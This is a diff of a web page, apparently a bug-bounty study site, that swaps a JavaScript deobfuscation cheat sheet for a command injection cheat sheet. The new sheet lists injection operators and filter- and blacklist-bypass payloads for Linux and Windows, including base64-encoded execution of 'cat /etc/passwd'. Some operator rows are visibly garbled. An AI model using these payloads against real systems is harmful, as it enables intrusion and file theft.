@@ -9,10 +9,10 @@
       
       
       
-        <link rel="prev" href="../attacking-web-applications-with-ffuf/">
+        <link rel="prev" href="../sqlmap-essentials/">
       
       
-        <link rel="next" href="../cross-site-scripting-%28xss%29/">
+        <link rel="next" href="../file-upload-attacks/">
       
       
       <link rel="icon" href="../../assets/images/favicon.png">
@@ -20,7 +20,7 @@
     
     
       
-        <title>JavaScript Deobfuscation - Bug Bounty Hub</title>
+        <title>Command Injections - Bug Bounty Hub</title>
       
     
     
@@ -62,7 +62,7 @@
     <div data-md-component="skip">
       
         
-        <a href="#javascript-deobfuscation" class="md-skip">
+        <a href="#command-injections" class="md-skip">
           Skip to content
         </a>
       
@@ -98,7 +98,7 @@
         <div class="md-header__topic" data-md-component="header-topic">
           <span class="md-ellipsis">
             
-              JavaScript Deobfuscation
+              Command Injections
             
           </span>
         </div>
@@ -431,32 +431,10 @@
                 
   
   
-    
   
   
-  
-    <li class="md-nav__item md-nav__item--active">
-      
-      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
-      
-      
-        
-      
-      
-        <label class="md-nav__link md-nav__link--active" for="__toc">
-          
-  
-  
-  <span class="md-ellipsis">
-    JavaScript Deobfuscation
-    
-  </span>
-  
-
-          <span class="md-nav__icon md-icon"></span>
-        </label>
-      
-      <a href="./" class="md-nav__link md-nav__link--active">
+    <li class="md-nav__item">
+      <a href="../javascript-deobfuscation/" class="md-nav__link">
         
   
   
@@ -467,62 +445,6 @@
   
 
       </a>
-      
-        
-
-<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
-  
-  
-  
-    
-  
-  
-    <label class="md-nav__title" for="__toc">
-      <span class="md-nav__icon md-icon"></span>
-      Table of contents
-    </label>
-    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
-      
-        <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
-    <span class="md-ellipsis">
-      Terms
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
-    <span class="md-ellipsis">
-      Commands
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
-    <span class="md-ellipsis">
-      Useful Websites
-    </span>
-  </a>
-  
-</li>
-      
-        <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
-    <span class="md-ellipsis">
-      Misc
-    </span>
-  </a>
-  
-</li>
-      
-    </ul>
-  
-</nav>
-      
     </li>
   
 
@@ -601,10 +523,32 @@
                 
   
   
+    
   
   
-    <li class="md-nav__item">
-      <a href="../command-injections/" class="md-nav__link">
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+        
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    Command Injections
+    
+  </span>
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
         
   
   
@@ -615,6 +559,101 @@
   
 
       </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="Table of contents">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Table of contents
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#injection-operators" class="md-nav__link">
+    <span class="md-ellipsis">
+      Injection Operators
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#linux" class="md-nav__link">
+    <span class="md-ellipsis">
+      Linux
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filtered-character-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filtered Character Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blacklisted-command-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blacklisted Command Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#windows" class="md-nav__link">
+    <span class="md-ellipsis">
+      Windows
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filtered-character-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filtered Character Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blacklisted-command-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blacklisted Command Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
     </li>
   
 
@@ -984,38 +1023,77 @@
     <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
       
         <li class="md-nav__item">
-  <a href="#terms" class="md-nav__link">
+  <a href="#injection-operators" class="md-nav__link">
     <span class="md-ellipsis">
-      Terms
+      Injection Operators
     </span>
   </a>
   
 </li>
       
         <li class="md-nav__item">
-  <a href="#commands" class="md-nav__link">
+  <a href="#linux" class="md-nav__link">
     <span class="md-ellipsis">
-      Commands
+      Linux
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Linux">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filtered-character-bypass" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filtered Character Bypass
     </span>
   </a>
   
 </li>
-      
-        <li class="md-nav__item">
-  <a href="#useful-websites" class="md-nav__link">
+        
+          <li class="md-nav__item">
+  <a href="#blacklisted-command-bypass" class="md-nav__link">
     <span class="md-ellipsis">
-      Useful Websites
+      Blacklisted Command Bypass
     </span>
   </a>
   
 </li>
+        
+      </ul>
+    </nav>
+  
+</li>
       
         <li class="md-nav__item">
-  <a href="#misc" class="md-nav__link">
+  <a href="#windows" class="md-nav__link">
     <span class="md-ellipsis">
-      Misc
+      Windows
     </span>
   </a>
+  
+    <nav class="md-nav" aria-label="Windows">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#filtered-character-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Filtered Character Bypass
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#blacklisted-command-bypass_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Blacklisted Command Bypass
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
   
 </li>
       
@@ -1035,176 +1113,271 @@
 
 
 
-<h1 id="javascript-deobfuscation">JavaScript Deobfuscation</h1>
-<h2 id="terms">Terms</h2>
+<h1 id="command-injections">Command Injections</h1>
+<h2 id="injection-operators">Injection Operators</h2>
 <table>
 <thead>
 <tr>
-<th>Term</th>
-<th>Description</th>
+<th>Injection Operator</th>
+<th>Injection Character</th>
+<th>URL-Encoded Character</th>
+<th>Executed Command</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td>Code minification</td>
-<td>Reduces code to a single line often saved as .min.js.</td>
+<td>Semicolon</td>
+<td>;</td>
+<td>%3b</td>
+<td>Both</td>
 </tr>
 <tr>
-<td>Packing</td>
-<td>Obfuscation recognizable from the six function arguments used in the initial function "function(p,a,c,k,e,d)".</td>
+<td>New Line</td>
+<td>\n</td>
+<td>%0a</td>
+<td>Both</td>
 </tr>
 <tr>
-<td>JSFuck</td>
-<td>Programming style based in the atomic parts of JS. Uses only ()+[]! (aa and jj encode are similar).</td>
+<td>Background</td>
+<td>&amp;</td>
+<td>%26</td>
+<td>Both (second output generally shown first)</td>
 </tr>
 <tr>
-<td>Base 64</td>
-<td>Contains only alpha-numeric, + and /. Padded with '='.</td>
+<td>Pipe</td>
+<td></td>
+<td></td>
+<td>%7c</td>
 </tr>
 <tr>
-<td>Hex</td>
-<td>Encodes each char into its hex on the ASCII table. Contains 0-9 and a-f.</td>
+<td>AND</td>
+<td>&amp;&amp;</td>
+<td>%26%26</td>
+<td>Both (only if first succeeds)</td>
 </tr>
 <tr>
-<td>Ceasar</td>
-<td>Shifts each char by a fixed number</td>
+<td>OR</td>
+<td></td>
+<td></td>
+<td></td>
 </tr>
 <tr>
-<td>Rot13</td>
-<td>Most common ceaser cipher, shifts by 13</td>
+<td>Sub-Shell</td>
+<td>``</td>
+<td>%60%60</td>
+<td>Both (Linux-only)</td>
+</tr>
+<tr>
+<td>Sub-Shell</td>
+<td>$()</td>
+<td>%24%28%29</td>
+<td>Both (Linux-only)</td>
 </tr>
 </tbody>
 </table>
-<h2 id="commands">Commands</h2>
+<h2 id="linux">Linux</h2>
+<h3 id="filtered-character-bypass">Filtered Character Bypass</h3>
 <table>
 <thead>
 <tr>
-<th>Command</th>
+<th>Code</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>curl http://SERVER_IP:PORT/</code></td>
-<td>cURL GET request</td>
+<td><code>printenv</code></td>
+<td>Can be used to view all environment variables</td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST</code></td>
-<td>cURL POST request</td>
+<td><strong>Spaces</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>curl -s http://SERVER_IP:PORT/ -X POST -d "param1=sample"</code></td>
-<td>cURL POST with data</td>
+<td><code>%09</code></td>
+<td>Using tabs instead of spaces</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | base64</code></td>
-<td>base64 encode</td>
+<td><code>${IFS}</code></td>
+<td>Will be replaced with a space and a tab. Cannot be used in sub-shells (i.e. $())</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_B64 | base64 -d</code></td>
-<td>base64 decode</td>
+<td><code>{ls,-la}</code></td>
+<td>Commas will be replaced with spaces</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | xxd -p</code></td>
-<td>hex encode</td>
+<td><strong>Other Characters</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><code>echo ENCODED_HEX | xxd -p -r</code></td>
-<td>hex decode</td>
+<td><code>${PATH:0:1}</code></td>
+<td>Will be replaced with /</td>
 </tr>
 <tr>
-<td><code>echo hackthebox | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 encode</td>
+<td><code>${LS_COLORS:10:1}</code></td>
+<td>Will be replaced with ;</td>
 </tr>
 <tr>
-<td><code>echo ENCODED_ROT13 | tr 'A-Za-z' 'N-ZA-Mn-za-m'</code></td>
-<td>rot13 decode</td>
+<td><code>$(tr '!-}' '"-~'&lt;&lt;&lt;[)</code></td>
+<td>Shift character by one ([ -&gt; )</td>
 </tr>
 </tbody>
 </table>
-<h2 id="useful-websites">Useful Websites</h2>
+<h3 id="blacklisted-command-bypass">Blacklisted Command Bypass</h3>
 <table>
 <thead>
 <tr>
-<th>Site</th>
+<th>Code</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><a href="https://jsconsole.com/">JS Console</a></td>
-<td>Interactive JavaScript console for testing code.</td>
+<td><strong>Character Insertion</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://www.toptal.com/developers/javascript-minifier">JS Minifier</a></td>
-<td>Minifies JavaScript for performance optimization.</td>
+<td><code>' or "</code></td>
+<td>Total must be even</td>
 </tr>
 <tr>
-<td><a href="https://beautifytools.com/javascript-obfuscator.php">BeatifyTools</a></td>
-<td>Obfuscates JavaScript to protect code.</td>
+<td><code>$@ or \</code></td>
+<td>Linux only</td>
 </tr>
 <tr>
-<td><a href="https://obfuscator.io/">JS Obfuscator Tool</a></td>
-<td>Tool to obfuscate JavaScript code securely.</td>
+<td><strong>Case Manipulation</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://jsfuck.com/">JSFuck</a></td>
-<td>Encodes JavaScript using only six characters.</td>
+<td><code>$(tr "[A-Z]" "[a-z]"&lt;&lt;&lt;"WhOaMi")</code></td>
+<td>Execute command regardless of cases</td>
 </tr>
 <tr>
-<td><a href="https://utf-8.jp/public/jjencode.html">jjencode</a></td>
-<td>Encodes JavaScript with JJEncode technique.</td>
+<td><code>$(a="WhOaMi";printf %s "${a,,}")</code></td>
+<td>Another variation of the technique</td>
 </tr>
 <tr>
-<td><a href="https://utf-8.jp/public/aaencode.html">aaencode</a></td>
-<td>Encodes JavaScript with AAEncode method.</td>
+<td><strong>Reversed Commands</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://prettier.io/playground/">Prettier</a></td>
-<td>Formats and beautifies JavaScript code.</td>
+<td><code>echo 'whoami' | rev</code></td>
+<td>Reverse a string</td>
 </tr>
 <tr>
-<td><a href="https://beautifier.io/">js-beautify</a></td>
-<td>Beautifies minified or obfuscated JavaScript.</td>
+<td><code>$(rev&lt;&lt;&lt;'imaohw')</code></td>
+<td>Execute reversed command</td>
 </tr>
 <tr>
-<td><a href="https://matthewfl.com/unPacker.html">UnPacker</a></td>
-<td>Deobfuscates and unpacks JavaScript code.</td>
+<td><strong>Encoded Commands</strong></td>
+<td></td>
 </tr>
 <tr>
-<td><a href="https://rot13.com/">rot13.com</a></td>
-<td>Applies ROT13 encoding/decoding for text.</td>
+<td><code>echo -n 'cat /etc/passwd | grep 33' | base64</code></td>
+<td>Encode a string with base64</td>
 </tr>
 <tr>
-<td><a href="https://www.boxentriq.com/code-breaking/cipher-identifier">Cipher Identifier</a></td>
-<td>Identifies cipher types in encoded text.</td>
+<td><code>bash&lt;&lt;&lt;$(base64 -d&lt;&lt;&lt;Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)</code></td>
+<td>Execute b64 encoded string</td>
 </tr>
 </tbody>
 </table>
-<h2 id="misc">Misc</h2>
+<h2 id="windows">Windows</h2>
+<h3 id="filtered-character-bypass_1">Filtered Character Bypass</h3>
 <table>
 <thead>
 <tr>
-<th>Command/Action</th>
+<th>Code</th>
 <th>Description</th>
 </tr>
 </thead>
 <tbody>
 <tr>
-<td><code>ctrl+u</code></td>
-<td>Show HTML source code in Firefox</td>
+<td><code>Get-ChildItem Env:</code></td>
+<td>Can be used to view all environment variables - (PowerShell)</td>
 </tr>
 <tr>
-<td><code>ctrl+shift+z</code></td>
-<td>Open browser debugger tab</td>
+<td><strong>Spaces</strong></td>
+<td></td>
 </tr>
 <tr>
-<td>'{ }' button</td>
-<td>Pretty print in debugger tab</td>
+<td><code>%09</code></td>
+<td>Using tabs instead of spaces</td>
 </tr>
 <tr>
-<td>Unpack</td>
-<td>Replace eval function with console.log</td>
+<td><code>%PROGRAMFILES:~10,-5%</code></td>
+<td>Will be replaced with a space - (CMD)</td>
+</tr>
+<tr>
+<td><code>$env:PROGRAMFILES[10]</code></td>
+<td>Will be replaced with a space - (PowerShell)</td>
+</tr>
+<tr>
+<td><strong>Other Characters</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>%HOMEPATH:~0,-17%</code></td>
+<td>Will be replaced with \ - (CMD)</td>
+</tr>
+<tr>
+<td><code>$env:HOMEPATH[0]</code></td>
+<td>Will be replaced with \ - (PowerShell)</td>
+</tr>
+</tbody>
+</table>
+<h3 id="blacklisted-command-bypass_1">Blacklisted Command Bypass</h3>
+<table>
+<thead>
+<tr>
+<th>Code</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Character Insertion</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>' or "</code></td>
+<td>Total must be even</td>
+</tr>
+<tr>
+<td><code>^</code></td>
+<td>Windows only (CMD)</td>
+</tr>
+<tr>
+<td><strong>Case Manipulation</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>WhoAmi</code></td>
+<td>Simply send the character with odd cases</td>
+</tr>
+<tr>
+<td><strong>Reversed Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>"whoami"[-1..-20] -join ''</code></td>
+<td>Reverse a string</td>
+</tr>
+<tr>
+<td><code>iex "$('imaohw'[-1..-20] -join '')"</code></td>
+<td>Execute reversed command</td>
+</tr>
+<tr>
+<td><strong>Encoded Commands</strong></td>
+<td></td>
+</tr>
+<tr>
+<td><code>[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))</code></td>
+<td>Encode a string with base64</td>
+</tr>
+<tr>
+<td><code>iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"</code></td>
+<td>Execute b64 encoded string</td>
 </tr>
 </tbody>
 </table>
